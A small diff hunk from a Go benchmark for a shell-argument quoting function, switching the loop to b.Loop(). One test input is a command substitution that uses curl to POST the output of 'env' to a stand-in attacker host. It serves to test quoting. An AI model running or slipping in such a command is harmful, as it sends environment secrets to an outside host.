@@ -259,8 +259,7 @@ func BenchmarkQuoteShellArg(b *testing.B) {
 		".'$(curl -X POST https://attacker.com/exfil -d \"$(env)\")'.",
 	}
 
-	b.ResetTimer()
-	for i := 0; i < b.N; i++ {
+	for b.Loop() {
 		for _, s := range testStrings {
 			_ = quoteShellArg(s)
 		}
